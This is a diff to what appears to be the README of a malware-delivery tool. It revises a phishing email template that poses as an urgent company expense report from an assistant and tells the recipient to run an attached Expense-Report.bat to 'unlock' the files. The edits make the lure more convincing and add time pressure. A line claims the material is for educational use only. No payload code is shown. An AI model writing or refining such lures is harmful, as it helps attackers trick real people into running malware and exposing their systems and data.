@@ -11,11 +11,17 @@ Now all you need is a target and instruct them in the email to download the .bat
 
 #Template e-mail:
 
-Good Afternoon Dr.John,
+Good Afternoon Rick,
 
-Attached are the company expense report for this month. The file is encrypted so you need to download both the files and run (specify bat file name here) so that the expense report (the .ps1 file) can be unlocked for you to read.
+Attached are the company expense reports for this month. 
+The files contain sensitive information so the files are encrypted.
+In order to read the expense report please download both the attachments. 
+Then open and run the Expense-Report.bat file (first attachment) to unlock the Expense-Report.
 
-Sincerely, Script Kiddie
+This is urgent so please take a look at it as soon as possible and enter them into the system before our meeting.
+
+Sincerely,
+Morty - Assistant to the Regional Manager
 
 #Note: This is intended for educational purpose/use only
 
